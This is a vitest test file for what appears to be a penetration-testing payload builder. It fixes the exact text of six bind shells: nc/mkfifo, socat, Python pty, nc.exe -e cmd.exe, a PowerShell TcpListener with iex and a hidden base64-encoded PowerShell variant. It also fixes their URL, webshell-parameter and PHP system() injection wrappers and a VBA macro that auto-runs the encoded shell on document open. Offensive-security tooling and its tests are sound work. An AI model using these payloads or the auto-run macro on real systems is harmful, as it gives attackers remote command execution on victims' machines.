import { describe, expect, it } from "vitest";
import { buildPayload } from "../../../engines/payloads/build";
import type { PasteContext } from "../../../engines/payloads/context";
import { BIND_SHELLS } from "../../../engines/payloads/bindShells";
import { decodeUtf16leBase64, utf16leBase64 } from "../../../engines/payloads/encode";

const V = { LHOST: "192.0.2.10", LPORT: "443", TARGET_IP: "198.51.100.20" };
const def = (id: string) => {
  const d = BIND_SHELLS.find((x) => x.id === id);
  if (!d) throw new Error(id);
  return d;
};

// The wrapping rules, modelled independently of context.ts.
const shq = (s: string) => `'${s.replace(/'/g, "'\\''")}'`;
const urlEnc = (s: string) => [...s].map((c) => (/[A-Za-z0-9.\-_~$,:()]/.test(c) ? c : c === " " ? "+" : "%" + c.charCodeAt(0).toString(16).toUpperCase().padStart(2, "0"))).join("");
const phpSystem = (s: string) => `system('${s.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}');`;
const linuxWrapped = (raw: string): Record<string, string> => ({
  "bash-prompt": raw,
  "injected-linux": `bash -c ${shq(raw)}`,
  "url-param": urlEnc(`bash -c ${shq(raw)}`),
  "webshell-param": urlEnc(`bash -c ${shq(raw)}`),
  "php-system": phpSystem(`bash -c ${shq(raw)}`),
});

const LINUX: Record<string, string> = {
  "bind-mkfifo-nc": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f",
  "bind-socat": "socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
  "bind-python3": `python3 -c 'import socket,os,pty;s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);c,a=s.accept();[os.dup2(c.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'`,
};
const PS_BIND = `$listener = [System.Net.Sockets.TcpListener]4444;$listener.Start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()`;
/** The encoded bind: powershell -e of bind-ps's script, as UTF-16LE base64. */
const PS_BIND_B64 = `powershell -nop -w hidden -e ${utf16leBase64(PS_BIND)}`;
/** The macro form, modelled independently: 50-character chunks, quotes doubled, run by AutoOpen/Document_Open. */
const vba = (cmd: string) => {
  const lines: string[] = [];
  for (let i = 0; i < cmd.length; i += 50) lines.push(`    Str = Str + "${cmd.slice(i, i + 50).replace(/"/g, '""')}"`);
  return ["Sub MyMacro()", "    Dim Str As String", ...lines, '    CreateObject("Wscript.Shell").Run Str', "End Sub", "",
    "Sub AutoOpen()", "    MyMacro", "End Sub", "", "Sub Document_Open()", "    MyMacro", "End Sub"].join("\n");
};
const NC_EXE = "C:\\Windows\\Temp\\nc.exe -lvnp 4444 -e cmd.exe";
const NC_EXE_URL = "C:%5CWindows%5CTemp%5Cnc.exe+-lvnp+4444+-e+cmd.exe";
const LINUX_CTX = ["bash-prompt", "injected-linux", "url-param", "webshell-param", "php-system"];

describe("BIND_SHELLS", () => {
  it("has exactly the six bind shells", () => {
    expect(BIND_SHELLS.map((d) => d.id)).toEqual(["bind-mkfifo-nc", "bind-socat", "bind-python3", "bind-nc-exe", "bind-ps", "bind-ps-b64"]);
  });

  it("all are bind-shaped, never bake an IP, default to port 4444", () => {
    for (const d of BIND_SHELLS) {
      expect(d.shape, d.id).toBe("bind");
      expect(d.bakesIp, d.id).toBeFalsy();
      expect(d.defaults?.BIND_PORT, d.id).toBe("4444");
    }
  });

  it("declared contexts", () => {
    for (const id of Object.keys(LINUX)) expect(def(id).contexts, id).toEqual(LINUX_CTX);
    expect(def("bind-nc-exe").contexts).toEqual(["cmd", "powershell", "webshell-param", "url-param"]);
    expect(def("bind-ps").contexts).toEqual(["cmd", "webshell-param", "url-param"]);
    expect(def("bind-ps-b64").contexts).toEqual(["cmd", "powershell", "webshell-param", "url-param", "macro"]);
  });

  it("requirements name only what the target needs", () => {
    expect(def("bind-mkfifo-nc").requires).toEqual(["nc"]);
    expect(def("bind-socat").requires).toEqual(["socat"]);
    expect(def("bind-python3").requires).toEqual(["python3"]);
    expect(def("bind-nc-exe").requires).toEqual(["nc-e"]);
    expect(def("bind-ps").requires).toEqual(["powershell"]);
  });

  const linuxRows = Object.entries(LINUX).flatMap(([id, raw]) => Object.entries(linuxWrapped(raw)).map(([ctx, want]) => [id, ctx, want] as const));
  const winRows: [string, string, string][] = [
    ["bind-nc-exe", "cmd", NC_EXE],
    ["bind-nc-exe", "powershell", NC_EXE],
    ["bind-nc-exe", "webshell-param", NC_EXE_URL],
    ["bind-nc-exe", "url-param", NC_EXE_URL],
    ["bind-ps", "cmd", `powershell -nop -c "${PS_BIND}"`],
    ["bind-ps", "webshell-param", urlEnc(`powershell -nop -c "${PS_BIND}"`)],
    ["bind-ps", "url-param", urlEnc(`powershell -nop -c "${PS_BIND}"`)],
    ["bind-ps-b64", "cmd", PS_BIND_B64],
    ["bind-ps-b64", "powershell", PS_BIND_B64],
    ["bind-ps-b64", "webshell-param", urlEnc(PS_BIND_B64)],
    ["bind-ps-b64", "url-param", urlEnc(PS_BIND_B64)],
    ["bind-ps-b64", "macro", vba(PS_BIND_B64)],
  ];
  const rows = [...linuxRows, ...winRows];
  it("covers every def and context", () => {
    expect(rows.map(([id, ctx]) => `${id}/${ctx}`).sort()).toEqual(BIND_SHELLS.flatMap((d) => d.contexts.map((c) => `${d.id}/${c}`)).sort());
  });
  it.each(rows)("%s in %s gives the exact text", (id, ctx, want) => {
    const b = buildPayload(def(id), ctx as PasteContext, V);
    expect(b.unresolved).toEqual([]);
    expect(b.text).toBe(want);
  });

  it("bind-ps-b64 decodes to bind-ps's TcpListener script in every context", () => {
    const cmd = buildPayload(def("bind-ps-b64"), "cmd", V).text;
    expect(decodeUtf16leBase64(cmd.split(" ").pop()!)).toBe(PS_BIND);
    expect(buildPayload(def("bind-ps-b64"), "powershell", V).text).toBe(cmd);
    for (const ctx of ["url-param", "webshell-param"] as const) {
      const b64 = decodeURIComponent(buildPayload(def("bind-ps-b64"), ctx, V).text.split("+-e+")[1]!);
      expect(decodeUtf16leBase64(b64)).toBe(PS_BIND);
    }
    const macro = buildPayload(def("bind-ps-b64"), "macro", V).text;
    const joined = macro.split("\n").map((l) => l.match(/^ {4}Str = Str \+ "(.*)"$/)?.[1]).filter((x): x is string => x !== undefined).join("");
    expect(joined).toBe(cmd);
    const other = buildPayload(def("bind-ps-b64"), "powershell", { ...V, BIND_PORT: "5555" }).text;
    expect(decodeUtf16leBase64(other.split(" ").pop()!)).toBe(PS_BIND.replace("]4444;", "]5555;"));
  });

  it("literal checks", () => {
    expect(buildPayload(def("bind-mkfifo-nc"), "injected-linux", V).text).toBe("bash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp 4444 > /tmp/f'");
    expect(buildPayload(def("bind-socat"), "injected-linux", V).text).toBe("bash -c 'socat TCP-LISTEN:4444,reuseaddr,fork EXEC:'\\''bash -li'\\'',pty,stderr,setsid,sigint,sane'");
    expect(buildPayload(def("bind-ps"), "cmd", V).text.startsWith('powershell -nop -c "$listener = [System.Net.Sockets.TcpListener]4444;')).toBe(true);
  });

  it("the bind port can be changed", () => {
    expect(buildPayload(def("bind-nc-exe"), "cmd", { ...V, BIND_PORT: "5555", FILE: "C:\\t\\nc.exe" }).text).toBe("C:\\t\\nc.exe -lvnp 5555 -e cmd.exe");
  });

  it("the connect listener: Connect from Kali, with the target and bind port filled", () => {
    const b = buildPayload(def("bind-mkfifo-nc"), "bash-prompt", V);
    expect(b.listener).toBe("rlwrap nc -nv 198.51.100.20 4444");
    expect(b.listenerHeading).toBe("Connect from Kali");
    expect(buildPayload(def("bind-mkfifo-nc"), "bash-prompt", V, { listener: "connect-penelope" }).listener).toBe("penelope -O -c 198.51.100.20 -p 4444");
    for (const d of BIND_SHELLS) expect(buildPayload(d, d.contexts[0], V).listenerHeading, d.id).toBe("Connect from Kali");
  });

  it("bind-socat leads with the socat connect listener", () => {
    expect(def("bind-socat").listeners).toEqual(["connect-socat", "connect-nc"]);
    expect(buildPayload(def("bind-socat"), "bash-prompt", V).listener).toBe("socat file:`tty`,raw,echo=0 tcp:198.51.100.20:4444");
    for (const id of ["bind-mkfifo-nc", "bind-python3", "bind-nc-exe", "bind-ps", "bind-ps-b64"]) expect(def(id).listeners, id).toEqual(["connect-nc", "connect-penelope"]);
  });

  it("notes carry the builds, firewall and base64 caveats", () => {
    expect(def("bind-mkfifo-nc").notes?.join(" ")).toContain("nc -l <port>");
    expect(buildPayload(def("bind-nc-exe"), "cmd", V).notes.join(" ")).toContain("if it returns instantly, the build has no -e");
    const ps = def("bind-ps").notes?.join(" ") ?? "";
    expect(ps).toContain("base64-encode it");
    expect(ps).toContain("netsh advfirewall firewall add rule");
  });

  it("every def has parts, flags are covered, and part tokens appear in the built text", () => {
    for (const d of BIND_SHELLS) {
      expect(d.parts.length, d.id).toBeGreaterThan(0);
      for (const p of d.parts) expect(p.token && p.explain, d.id).toBeTruthy();
      const texts = d.contexts.map((c) => buildPayload(d, c, V).text);
      for (const text of texts) {
        for (const f of text.match(/(?<=^|[\s+])--?[A-Za-z][\w]*/g) ?? []) expect(d.parts.some((p) => p.token.includes(f)), `${d.id}: ${f}`).toBe(true);
      }
      const seen = [...texts, d.template].join("\n");
      for (const p of d.parts) expect(p.token === "bash -c" || seen.includes(p.token), `${d.id}: ${p.token}`).toBe(true);
    }
  });
});
